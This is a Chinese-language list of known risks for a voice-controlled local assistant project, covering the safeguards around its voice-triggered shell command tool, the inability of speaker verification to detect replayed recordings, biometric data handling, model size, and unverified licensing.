- **`shell.run` 是全项目最大的安全风险面** — 「语音说一句话就能在本机执行命令」。声纹门砍掉「他人语音」这一支,但**误识别与录音回放仍然存在**,所以默认关闭 + 白名单 + 每次 UI 确认 + 危险模式拦截 + 审计日志五层一条都不能省(ADR 005)。
- **声纹不防录音回放** — 本轮不做反欺骗模型,这是**已知缺口**而非尚未测到(ADR 002 局限节)。真实人声的判别力已有 AUTO 背书(簇内 0.736 / 簇间 0.370),但**合成音频完全测不出判别力** —— 120 Hz 与 240 Hz 两组谐波栈互相通过 0.767,任何用生成音调测声纹的测试都会空过。
- **声纹注册数据是生物特征** — `enrollment/` 已在 `.gitignore` 内,永不提交;查看注册状态只用 `describe()`。
- **VoxCord 不在本机** — `D:\program\voxcord` 不存在,相关测试自动 skip;它是可选参考依赖,不影响发布路径。
- **模型体积大** — `models/` 约 451 MB(含两个未清理的 `.tar.bz2` 归档共 192 MB,以及 37.8 MB 声纹模型);打包策略需在 P8 前决定。多 agent 子进程并发另有内存压力,派发并发上限已落(`DEFAULT_MAX_CONCURRENT = 3`,`RACE_WIDTH = 2`)。
- **开源项目判定多为「社区来源」** — `github.com` / `api.github.com` / `raw.githubusercontent.com` 的 WebFetch 在本环境全部被拦截,无法读取一手 README。除注明「官方文档确认」者外,star 数、许可证、最后提交时间均未直接核实,不得当官方结论用。
- **SenseVoiceSmall 权重许可证未取证** — 若启用该 ASR 备选,须先归档 ModelScope 许可证文本。
- **控制台中文乱码** — Windows 代码页显示问题,UTF-8 字节本身正确,不是数据缺陷。
